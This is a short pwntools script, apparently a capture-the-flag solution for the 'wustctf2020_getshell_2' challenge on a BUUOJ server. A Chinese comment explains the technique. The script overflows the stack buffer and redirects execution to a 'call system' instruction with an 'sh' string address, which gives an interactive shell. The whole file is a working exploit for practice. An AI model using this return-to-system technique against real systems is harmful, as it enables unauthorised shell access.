
from pwn import*
elf=ELF('./wustctf2020_getshell_2')
#p=process('./wustctf2020_getshell_2')
p=remote('node4.buuoj.cn',29603)

#sys=0x8048529
sys=0x8048529#可以溢出0xc字节，但是没法利用plt地址了，因为plt地址需要返回值，可溢出的地址位数不够，所以只能用shell函数里的call system来调用system，call函数不用返回值了，它会自己把下一条指令给压进去
sh_addr=0x8048670

payload=b'a'*(0x18+4)+p32(sys)+p32(sh_addr)

p.sendline(payload)
p.interactive()
